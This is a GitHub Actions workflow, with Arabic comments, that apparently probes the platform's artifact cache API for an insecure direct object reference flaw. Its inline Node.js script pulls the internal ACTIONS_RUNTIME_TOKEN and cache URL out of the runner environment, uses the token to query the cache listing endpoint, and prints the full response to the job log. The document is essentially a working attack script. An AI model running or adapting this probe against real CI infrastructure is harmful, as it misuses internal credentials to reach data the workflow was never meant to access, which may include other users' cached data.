name: Cache API IDOR Test V4
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Trigger Cache Env Vars
        uses: actions/cache@v3
        with:
          path: |
            ~/.npm
          key: ${{ runner.os }}-dummy-cache-${{ github.run_id }}
          restore-keys: |
            ${{ runner.os }}-dummy-cache-
      
      - name: Query Internal Cache API via Node.js
        run: |
          node -e "
            const https = require('https');
            const url = require('url');

            // 1. استخراج المتغيرات من ذاكرة العملية
            const ENV = process.env;
            const CACHE_URL = ENV.ACTIONS_CACHE_URL;
            const TOKEN = ENV.ACTIONS_RUNTIME_TOKEN;

            console.log('Cache URL found:', CACHE_URL ? 'yes' : 'no');
            console.log('Token found:', TOKEN ? 'yes' : 'no');

            if (CACHE_URL && TOKEN) {
              // 2. مسار الـ API الخاص بالكاش
              const queryUrl = CACHE_URL + '_apis/artifactcache/caches';
              console.log('Sending IDOR request to:', queryUrl);

              const parsedUrl = new URL(queryUrl);
              
              const options = {
                hostname: parsedUrl.hostname,
                path: parsedUrl.pathname + parsedUrl.search,
                method: 'GET',
                headers: {
                  'Authorization': 'Bearer ' + TOKEN,
                  'Accept': 'application/json'
                }
              };

              // 3. إرسال الطلب
              const req = https.request(options, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => {
                  console.log('Status Code:', res.statusCode);
                  console.log('API Response:', data);
                });
              });

              req.on('error', (e) => console.error('Error:', e.message));
              req.end();
            } else {
              console.log('Failed to extract internal tokens.');
            }
          "
